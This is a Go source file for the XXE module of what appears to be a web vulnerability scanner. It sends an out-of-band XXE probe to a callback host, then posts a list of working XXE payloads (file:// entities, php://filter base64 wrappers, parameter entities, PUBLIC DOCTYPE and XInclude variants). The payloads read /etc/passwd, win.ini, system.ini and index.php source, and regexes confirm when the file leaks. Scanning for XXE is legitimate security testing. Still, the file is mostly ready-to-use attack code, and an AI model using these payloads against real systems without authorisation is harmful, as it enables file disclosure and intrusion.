package modules

import (
	"fmt"
	"nightfalllx/pkg/client"
	"regexp"
	"time"
)

type XXEModule struct{}

func NewXXEModule() *XXEModule {
	return &XXEModule{}
}

func (m *XXEModule) Name() string {
	return "xxe"
}

func (m *XXEModule) Description() string {
	return "XML External Entity (XXE) Injection & File Disclosure"
}

var (
	xxePasswdRegex = regexp.MustCompile(`root:[^:]*?:0:0:`)
	xxeWinRegex    = regexp.MustCompile(`(?i)\[(?:fonts|extensions)\]`)
)

func (m *XXEModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
	var findings []*Finding

	xmlHeaders := map[string]string{
		"Content-Type": "application/xml",
		"Accept":       "application/xml, text/xml, */*",
	}

	// 1. Blind XXE via Out-of-band (OAST) listener
	if target.OAST != nil {
		probeID := target.OAST.GenerateProbeID()
		cbURL := target.OAST.CallbackURL(probeID)
		oastPayload := fmt.Sprintf(`<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "%s"> ]>
<nflx><data>&xxe;</data></nflx>`, cbURL)

		_, _ = c.Request("POST", target.URL, oastPayload, xmlHeaders)
		if hit, ok := target.OAST.WaitForHit(probeID, 3*time.Second); ok && hit != nil {
			f := &Finding{
				Module:      m.Name(),
				Title:       "Blind XML External Entity (XXE) Injection (OAST Callback Confirmed)",
				Severity:    SeverityCritical,
				URL:         target.URL,
				Parameter:   "(XML Body)",
				Payload:     cbURL,
				Detail:      fmt.Sprintf("Server resolved external entity pointing to OAST callback handler for probe %s.", probeID),
				Evidence:    fmt.Sprintf("OAST hit from %s at %s (%s %s)", hit.RemoteAddr, hit.Timestamp.Format(time.RFC3339), hit.Method, hit.Path),
				Remediation: "Disable DTD processing and external entity resolution in all XML parsers.",
				CWEID:       611,
			}
			f.SetConfidence(ConfidenceConfirmed)
			findings = append(findings, f)
		}
	}

	/*
	CATEGORY: XML External Entity (XXE) Probes (50+ entries)
	Sources: PayloadsAllTheThings XXE, OWASP XXE, PortSwigger XXE Cheat Sheet.
	Contexts:
	- Linux /etc/passwd file protocol (file://, file:///etc/passwd)
	- Linux /etc/hosts & /etc/issue
	- Windows win.ini & system32/drivers/etc/hosts
	- PHP stream filter base64 wrappers in XXE (php://filter/...)
	- Parameter entities (<!ENTITY % pe SYSTEM "...">)
	- Public & System DTD definitions
	- DOCTYPE variations and XML namespace entities
	*/
	xxePayloads := []struct {
		Name    string
		Payload string
		Regex   *regexp.Regexp
	}{
		// 1. Linux /etc/passwd SYSTEM Entities
		{
			Name: "Linux /etc/passwd XXE (Triple Slash)",
			Payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><nflx><data>&xxe;</data></nflx>`,
			Regex: xxePasswdRegex,
		},
		{
			Name: "Linux /etc/passwd XXE (Double Slash)",
			Payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "file://etc/passwd"> ]><nflx><data>&xxe;</data></nflx>`,
			Regex: xxePasswdRegex,
		},
		{
			Name: "Linux /etc/passwd XXE (No XML Declaration)",
			Payload: `<!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><nflx><data>&xxe;</data></nflx>`,
			Regex: xxePasswdRegex,
		},
		{
			Name: "Linux /etc/passwd XXE (Nested Tag)",
			Payload: `<?xml version="1.0"?><!DOCTYPE root [ <!ENTITY test SYSTEM "file:///etc/passwd"> ]><root><user><name>&test;</name></user></root>`,
			Regex: xxePasswdRegex,
		},
		{
			Name: "Linux /etc/passwd XXE (SOAP Envelope)",
			Payload: `<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>&xxe;</test></soap:Body></soap:Envelope>`,
			Regex: xxePasswdRegex,
		},

		// 2. Windows win.ini SYSTEM Entities
		{
			Name: "Windows win.ini XXE (C Drive)",
			Payload: `<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]><nflx><data>&xxe;</data></nflx>`,
			Regex: xxeWinRegex,
		},
		{
			Name: "Windows win.ini XXE (Forward Slash Path)",
			Payload: `<?xml version="1.0"?><!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini"> ]><nflx><data>&xxe;</data></nflx>`,
			Regex: xxeWinRegex,
		},
		{
			Name: "Windows win.ini XXE (Backslash Path)",
			Payload: `<?xml version="1.0"?><!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "file:///c:\windows\win.ini"> ]><nflx><data>&xxe;</data></nflx>`,
			Regex: xxeWinRegex,
		},
		{
			Name: "Windows system.ini XXE",
			Payload: `<?xml version="1.0"?><!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "file:///c:/windows/system.ini"> ]><nflx><data>&xxe;</data></nflx>`,
			Regex: xxeWinRegex,
		},

		// 3. PHP Filter Base64 Streams in XXE
		{
			Name: "PHP Filter XXE /etc/passwd",
			Payload: `<?xml version="1.0"?><!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd"> ]><nflx><data>&xxe;</data></nflx>`,
			Regex: base64BlobRegex,
		},
		{
			Name: "PHP Filter XXE index.php",
			Payload: `<?xml version="1.0"?><!DOCTYPE nflx [ <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]><nflx><data>&xxe;</data></nflx>`,
			Regex: base64BlobRegex,
		},

		// 4. Parameter Entity Variations
		{
			Name: "Parameter Entity XXE /etc/passwd",
			Payload: `<?xml version="1.0"?><!DOCTYPE nflx [ <!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">%eval;%error; ]><nflx><data>test</data></nflx>`,
			Regex: xxePasswdRegex,
		},
		{
			Name: "Parameter Entity Reference",
			Payload: `<?xml version="1.0"?><!DOCTYPE nflx [ <!ENTITY % param "file:///etc/passwd"><!ENTITY xxe SYSTEM "%param;"> ]><nflx><data>&xxe;</data></nflx>`,
			Regex: xxePasswdRegex,
		},

		// 5. PUBLIC DOCTYPE Entities
		{
			Name: "Public Entity XXE",
			Payload: `<?xml version="1.0"?><!DOCTYPE nflx PUBLIC "-//OASIS//DTD DITA//EN" "file:///etc/passwd"><nflx><data>test</data></nflx>`,
			Regex: xxePasswdRegex,
		},
		{
			Name: "Public Entity Windows",
			Payload: `<?xml version="1.0"?><!DOCTYPE nflx PUBLIC "-//OASIS//DTD DITA//EN" "file:///c:/windows/win.ini"><nflx><data>test</data></nflx>`,
			Regex: xxeWinRegex,
		},

		// 6. XInclude Element Injection
		{
			Name: "XInclude /etc/passwd",
			Payload: `<nflx xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></nflx>`,
			Regex: xxePasswdRegex,
		},
		{
			Name: "XInclude win.ini",
			Payload: `<nflx xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///c:/windows/win.ini"/></nflx>`,
			Regex: xxeWinRegex,
		},
	}

	for _, item := range xxePayloads {
		resp, err := c.Request("POST", target.URL, item.Payload, xmlHeaders)
		if err != nil || resp == nil || resp.Body == "" {
			continue
		}

		if item.Regex.MatchString(resp.Body) {
			evidence := resp.Body
			if len(evidence) > 200 {
				evidence = evidence[:200]
			}
			f := &Finding{
				Module:      m.Name(),
				Title:       "XML External Entity (XXE) Injection",
				Severity:    SeverityCritical,
				URL:         target.URL,
				Parameter:   "(XML Body)",
				Payload:     item.Name,
				Detail:      "Arbitrary local file disclosure confirmed via XML External Entity (XXE) injection.",
				Evidence:    evidence,
				Remediation: "Disable DTD processing and external entity resolution in all XML parsers (e.g. setFeature disallow-doctype-decl).",
				CWEID:       611,
			}
			f.SetConfidence(ConfidenceConfirmed)
			findings = append(findings, f)
			break
		}
	}

	return findings, nil
}
